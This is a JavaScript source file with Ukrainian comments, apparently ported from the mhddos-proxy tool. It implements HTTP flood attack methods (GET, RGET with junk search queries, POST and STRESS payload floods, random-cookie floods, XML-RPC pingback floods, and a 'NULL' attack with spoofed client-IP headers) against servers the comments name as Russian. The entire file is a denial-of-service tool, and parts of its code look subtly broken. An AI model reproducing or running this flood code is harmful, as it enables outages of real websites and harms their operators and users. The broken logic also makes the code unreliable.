/**
 * Основні HTTP заголовки для **POST** запитів
 */
const BASE_HEADERS = {
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'en-US,en;q=0.9',
	'Cache-Control':'max-age=0',
	'Connection':'Keep-Alive',
	'Sec-Fetch-Dest':'document',
	'Sec-Fetch-Mode':'navigate',
	'Sec-Fetch-Site':'none',
	'Sec-Fetch-User':'?1',
	'Sec-Gpc':'1',
	'Pragma':'no-cache',
	'Upgrade-Insecure-Requests': '1'
};

const USERAGENT = await randomUseragent();

/**
 * Основний конфіг для **POST** і **GET** запитів `fetch`
 */
const BASIC_MODES = {
	mode: 'no-cors',
	referrerPolicy: 'no-referrer',
	cache: 'no-cache'
};

/****POST** Запит*/
const POST = {method: "POST"};
/****GET** Запит*/
const GET = {method: "GET"};


/**
 * **MIME* Типи пакетів
 * 
 * Застосовуються для приготування пакетів
 */
const MIME = {
	json: "application/json",
	xml: "application/xml"
};


/**
 * Змішування заголовків
 * 
 * Змішуються задані заголовки з основними (`BASIC_MODES`)
 * 
 * ---
 * 
 * Змішувач бандера-смузі)
 * @param {object} headers
 * @returns {Promise<object>} Готові заголовки
 */
async function composeHeaders(headers) {
	return {...BASE_HEADERS, ...headers}
};

/**
 * Змішування заголовків для POST запитів
 * @param {number} cl **Довжина запиту**
 * @param {MIME} ct **Тип запиту**
 * @param {string} body **Тіло запиту** (флуд)
 * @returns {Promise<object>} Готові заголовки
 */
async function composePostHeaders(cl, ct, body) {
	return {
		...POST,
		headers: composeHeaders(
			{
				'Content-Length': cl,
				'X-Requested-With': 'XMLHttpRequest',
				'Content-Type': ct
			}
		),
		body: body
	}
};


/**
 * ## Генератор URL для GET запиту з "начинкою"
 * 
 * ---
 * Створюється запит з `?q`, чому я так зробив?
 * 
 * А тому що `q` використовується в основному для пошуку, наприклад якоїсь статті на сайті
 * 
 * І це буде навантажувати сервер, бо йому доведеться довго шукати ту статтю
 * 
 * ---
 * @param {string} url **URL-Адреса**
 * @returns {Promise<string>} **URL**
 */
const composeURL = async url => 
!url.search(/\?/) ? url + `?q=${await getFloodString(64)}` : url;


/**
 * Генератор пакету для **POST** запиту
 * @param {number} size **Вага ~~бомби~~ пакету**
 * @param {MIME} type **Тип запиту**
 * @returns {string} Пакет
 */
function Packet(size, type) {
	const flood = getFloodString(size)
	return type != FloodType.xml ? 
	[MIME.json, `{"data": "${flood}"}`] : flood
}


/**
 * Генератор запиту
 * @param {string} target **Ціль**
 * @param {object} config **Конфіг**
 * @returns {Promise<Response>} Відповідь
 */
async function request(target, config) {
	return await fetch(
		target,
		{...BASIC_MODES, ...config}
	)
	.then(add_count)
};

/**
 * spoof_ip
 * 
 * @returns {Promise<object>} Заголовки
 */
async function spoof_ip() {
	const spoof = await getRandomIP()

	return {
		"Via": spoof,
		"Client-IP": spoof,
		"X-Forwarded-Proto": "https",
		"X-Forwarded-For": spoof,
		"Real-IP": spoof,
		"User-Agent": USERAGENT
	}
}

/**
 * # Методи атак
 * 
 * - **GET**
 * - **RGET**
 * - **POST**
 * - **STRESS**
 * - **COOKIE**
 * - **XMLRPC**
 * - **NULL**
 * 
 * Код було перекладено з **_Python_** на **_JavaScript_**
 * 
 * Репозиторій: mhddos-proxy
 * 
 * ---
 * @author [**BogdanDevUA**](https://github.com/BogdanDevUA)
 * @license Unlicense
 */
class Methods {
	/**
	 * Конструктор
	 * @param {string} target **Ціль**
	 */
	constructor(target) {
		this.target = target
	};

	/**
	 * ## Генератор простого та швидкого [**GET**](https://google.com/?q=GET+Запити) запиту
	 * 
	 * Це швидкий GET запит без пакету (Підходить для 3G з'єднання (надіюсь))
	 * 
	 * Швидкий - тому що він не надсилає ніяких пакетів, і не обтяжує ваше з'єднання з сервером
	 * 
	 * ---
	 * @returns {Promise<Response>} Відповідь
	 */
	async GET() {
		return await request(this.target[0], GET)
	};

	/**
	 * ## Генератор [**GET**](https://google.com/?q=GET+Запити) запиту з начинкою (пакетом)
	 * 
	 * ---
	 * Приклад:
	 * - `https://russia.ru?q=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx...`
	 * 
	 * @returns {Promise<Response>} Відповідь
	 */
	async RGET() {
		return await request(await composeURL(this.target[0]), GET)
	};

	/**
	 * ## Генератор [**POST**](https://google.com/?q=POST+Запити) запиту з бомбою
	 * 
	 * Приклад:
	 * - `https://russia.ru`
	 * ---
	 * Данні користувачу не видимі, але вони є
	 * 
	 * За завісою:
	 * - `Content-Type: application/json`
	 * - ```
	 * {"data": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx..."}
	 * ```
	 * ---
	 * Ці пакети **середньої важкості**, і нормально навантажують сервери русні)
	 * @returns {Promise<Response>} Відповідь
	 */
	async POST() {
		return await request(this.target[0], 
			await composePostHeaders(76, ...Packet(128, MIME.json))
		)
	};

	/**
	 * ## Генератор [**POST**](https://google.com/?q=POST+Запити) запиту з ядерною бомбою
	 * 
	 * Приклад:
	 * - `https://russia.ru`
	 * ---
	 * Данні користувачу не видимі, але вони є
	 * 
	 * За завісою:
	 * - `Content-Type: application/json`
	 * - ```
	 * {"data": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx..."}
	 * ```
	 * ---
	 * Ці пакети **дуже важкі**, і добряче навантажують сервери русні)
	 * 
	 * @param {boolean} big_packets Чи використовувати великі пакети
	 * @returns {Promise<Response>} Відповідь
	 */
	async STRESS(big_packets=false) {
		return await request(this.target[0], 
			big_packets?
			await composePostHeaders(
				2060, ...Packet(2048, MIME.json)
			):
			await composePostHeaders(
				524, ...Packet(512, MIME.json)
			)

		)
	};

	/**
	 * Генератор [**POST**](https://google.com/?q=POST+Запити) запиту з ["пряниками"](https://google.com/?q=Що+таке+%22Cookies%22+в+сайтах) для русні)
	 * 
	 * ---
	 * Цей метод відправляє рандомні [**Cookies**](https://google.com/?q=Що+таке+%22Cookies%22+в+сайтах)
	 * 
	 * Пряники ці - з **проносним**, спеціально для русні)
	 * 
	 * @returns {Promise<Response>} Відповідь
	 */
	async COOKIE() {
		return await request(this.target[0], {
			...POST,
			headers: composeHeaders(
				{'Cookie': `_ga=GA${getRandomArbitrary(1000, 99999)};
				 _gat=1;
				 __cfduid=dc232334gwdsd23434542342342342475611928;
				 ${Packet(6)}=${Packet(32)}`}
			)
		})
	};
	
	/**
	 * ## Генератор [**POST**](https://google.com/?q=POST+Запити) запиту з бомбою
	 * 
	 * Приклад:
	 * - `https://russia.ru`
	 * ---
	 * Данні користувачу не видимі, але вони є
	 * 
	 * За завісою:
	 * - `Content-Type: application/xml`
	 * - ```
	 * {"data": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx..."}
	 * ```
	 * ---
	 * 
	 * Ці пакети **середньої важкості**, і нормально навантажують сервери русні)
	 * 
	 * @returns {Promise<Response>} Відповідь
	 */
	async XMLRPC() {
		return await request(this.target[0], {
			...POST,
			headers: await composePostHeaders(
				345, 
				MIME.xml,
				"<?xml version='1.0' encoding='iso-8859-1'?>" +
				'<methodCall><methodName>pingback.ping</methodName>' +
				`<params><param><value><string>${floodString(64)}</string></value>` +
				`</param><param><value><string>${floodString(64)}</string>` +
				'</value></param></params></methodCall>'
			)
		})
	};

	/**
	 * ## NULL Атака
	 * 
	 * Я й сам не поняв як це працює.
	 * 
	 * @returns {Promise<Response>} Відповідь
	 */
	async NULL() {
		return await request(this.target[0], {
			...POST,
			headers: await composeHeaders({
				'User-Agent': 'null',
				'Referer': 'null',
				...await spoof_ip()
			})
		})		
	}
}